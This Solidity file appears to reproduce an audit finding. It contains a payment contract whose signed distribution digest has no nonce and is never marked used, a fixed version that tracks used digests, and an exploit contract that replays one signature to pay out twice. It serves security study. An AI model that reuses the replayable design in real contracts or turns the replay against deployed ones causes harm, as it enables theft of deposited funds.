// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

/*
 * AuditVault 59205 — NetMind Payment.distribute (Quantstamp).
 * The distribution digest is keccak256(abi.encode(paymentId, gpu, gpuFee, platFee, expir)).
 * It has no nonce and is never marked used. One authorized signature pays 2 NMT to the
 * GPU provider and 1 NMT to feeTo, then the same bytes pay again.
 *
 * Signer (held here): 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
 * Digest and signature precomputed offline with cast abi-encode / cast keccak /
 * cast wallet sign --no-hash. The second call is the replay.
 */

contract NMT {
    string public name = "NetMind Token";
    string public symbol = "NMT";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract Payment {
    struct Pay {
        uint256 balance;
        uint256 distributed;
    }

    NMT public token;
    address public authorizedSigner;
    address public feeTo;
    mapping(uint256 => Pay) public payments;

    constructor(NMT _token, address _signer, address _feeTo) {
        token = _token;
        authorizedSigner = _signer;
        feeTo = _feeTo;
    }

    function deposit(uint256 paymentId, uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        payments[paymentId].balance += amount;
    }

    function hashDistribution(uint256 paymentId, address gpu, uint256 gpuFee, uint256 platFee, uint256 expir)
        public
        pure
        returns (bytes32)
    {
        return keccak256(abi.encode(paymentId, gpu, gpuFee, platFee, expir));
    }

    function distribute(
        uint256 paymentId,
        address gpu,
        uint256 gpuFee,
        uint256 platFee,
        uint256 expir,
        bytes calldata sig
    ) external {
        require(block.timestamp <= expir, "expired");
        Pay storage p = payments[paymentId];
        require(p.balance >= p.distributed + gpuFee + platFee, "funds");
        bytes32 digest = hashDistribution(paymentId, gpu, gpuFee, platFee, expir);
        address signer = _recover(digest, sig);
        require(signer == authorizedSigner, "sig");
        // @> VULN:
        p.distributed += gpuFee + platFee;
        token.transfer(gpu, gpuFee);
        token.transfer(feeTo, platFee);
    }

    function _recover(bytes32 digest, bytes calldata sig) internal pure returns (address) {
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := calldataload(sig.offset)
            s := calldataload(add(sig.offset, 32))
            v := byte(0, calldataload(add(sig.offset, 64)))
        }
        if (v < 27) v += 27;
        return ecrecover(digest, v, r, s);
    }
}

contract PaymentFixed {
    struct Pay {
        uint256 balance;
        uint256 distributed;
    }

    NMT public token;
    address public authorizedSigner;
    address public feeTo;
    mapping(uint256 => Pay) public payments;
    mapping(bytes32 => bool) public used;

    constructor(NMT _token, address _signer, address _feeTo) {
        token = _token;
        authorizedSigner = _signer;
        feeTo = _feeTo;
    }

    function deposit(uint256 paymentId, uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        payments[paymentId].balance += amount;
    }

    function distribute(
        uint256 paymentId,
        address gpu,
        uint256 gpuFee,
        uint256 platFee,
        uint256 expir,
        bytes calldata sig
    ) external {
        require(block.timestamp <= expir, "expired");
        bytes32 digest = keccak256(abi.encode(paymentId, gpu, gpuFee, platFee, expir));
        require(!used[digest], "replay");
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := calldataload(sig.offset)
            s := calldataload(add(sig.offset, 32))
            v := byte(0, calldataload(add(sig.offset, 64)))
        }
        if (v < 27) v += 27;
        require(ecrecover(digest, v, r, s) == authorizedSigner, "sig");
        used[digest] = true;
        Pay storage p = payments[paymentId];
        require(p.balance >= p.distributed + gpuFee + platFee, "funds");
        p.distributed += gpuFee + platFee;
        token.transfer(gpu, gpuFee);
        token.transfer(feeTo, platFee);
    }
}

contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address internal constant SIGNER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    address internal constant FEE_TO = 0x000000000000000000000000000000000000fEE2;

    uint256 internal constant PAYMENT_ID = 1;
    uint256 internal constant GPU_FEE = 2 ether;
    uint256 internal constant PLAT_FEE = 1 ether;
    uint256 internal constant EXPIR = 2_000_000_000;
    uint256 internal constant DEPOSIT = 10 ether;

    bytes internal constant SIG =
        hex"6c65eee89f4313e352fe854000eabbf4e7e13a06b87fba39947ee804026c2b7e06b9d7b8d9559a2b812d4124164fc6cf922836c49dab06ca395c9b34766a47731c";

    NMT public token;
    Payment public payment;
    uint256 public gpuPaid;
    uint256 public feePaid;
    uint256 public distributed;

    function run() external {
        token = new NMT();
        payment = new Payment(token, SIGNER, FEE_TO);
        token.mint(address(this), DEPOSIT);
        token.approve(address(payment), DEPOSIT);
        payment.deposit(PAYMENT_ID, DEPOSIT);

        payment.distribute(PAYMENT_ID, ATTACKER, GPU_FEE, PLAT_FEE, EXPIR, SIG);
        payment.distribute(PAYMENT_ID, ATTACKER, GPU_FEE, PLAT_FEE, EXPIR, SIG);

        gpuPaid = token.balanceOf(ATTACKER);
        feePaid = token.balanceOf(FEE_TO);
        (, distributed) = payment.payments(PAYMENT_ID);
        require(gpuPaid == 4 ether, "gpu");
        require(feePaid == 2 ether, "fee");
        require(distributed == 6 ether, "distributed");
        require(token.balanceOf(address(payment)) == 4 ether, "left");
    }
}
